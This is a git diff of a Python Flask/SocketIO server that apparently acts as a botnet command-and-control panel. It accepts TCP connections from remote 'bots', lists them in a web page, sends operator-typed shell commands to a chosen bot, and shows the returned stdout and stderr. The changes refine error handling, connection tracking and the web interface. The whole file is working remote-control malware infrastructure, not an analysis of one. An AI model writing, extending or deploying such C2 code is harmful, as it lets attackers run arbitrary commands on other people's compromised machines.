@@ -5,15 +5,14 @@ from threading import Thread
 from flask import Flask, render_template, session, request
 from flask_socketio import SocketIO, emit
 
-''' Sumner: if you are reading this I have only just got the main concept working,
-Looks pretty dope though so far.
+''' See accompanying README for TODOs.
 
  To run: python server.py'''
 
 HOST = 'localhost'
 PORT = 1708
 allConnections = {}
-connected = 'EvanKing' #temp variable for testing
+connected = ''  # temp variable for testing
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -32,24 +31,25 @@ def index():
     if request.method == 'POST':
         select = request.form.get('bot')
         connected = str(select)
-    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)
+    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
+                           connected=connected)
 
 
 @socketio.on('send_command', namespace='/bot')
 def send_receive(cmd):
-    output = allConnections[connected].send(cmd['data'])
-    output = json.loads(output)['output']
-    if output:
+    raw_output = ''
+    try:
+        raw_output = allConnections[connected].send(cmd['data'])
+    except:
         emit('response',
-             {'data': output[:-1]})
+             {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
+    if raw_output:
+        output = json.loads(raw_output)
+        stdout = output['stdout']
+        stderr = output['stderr']
+        emit('response',
+             {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
-
-#TODO: not done
-@app.route("/", methods=['GET', 'POST'])
-def bot_selector():
-    select = request.form.get('bot')
-    connected = str(select)
-    print connected
 
 class BotNet(Thread):
     def __init__(self, tcpsock):
@@ -61,23 +61,28 @@ class BotNet(Thread):
             self.tcpsock.listen(5)
             (clientsock, (ip, port)) = self.tcpsock.accept()
             host_info = json.loads(recv_timeout(clientsock))
+            user = host_info['user'][:-1]
+
             print "[+] Recieved connection from {}".format(host_info['user'])
-            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)
+            socketio.emit('connection', {'user': user}, namespace='/bot')
+            allConnections[user] = Bot(clientsock, host_info)
 
 
-# TODO: can make this multi-threaded if want to send to multiple clients at once
+# TODO: can make this multi-threaded if want to send to multiple clients at once in the future
 class Bot:
     def __init__(self, sock, host_info):
         self.sock = sock
-        self.arch = host_info['arch']
-        self.user = host_info['user']
+        self.arch = host_info['arch'][:-1]
+        self.user = host_info['user'][:-1]
 
     def send(self, cmd):
         cmd += '\n'
         totalsent = 0
         while totalsent < len(cmd):
-            sent = self.sock.send(cmd[totalsent:])
-            if sent == 0:
+            try:
+                sent = self.sock.send(cmd[totalsent:])
+            except:
+                del allConnections[self.user]
                 raise RuntimeError("[-] Lost connection to {}".format(self.user))
             totalsent = totalsent + sent
 
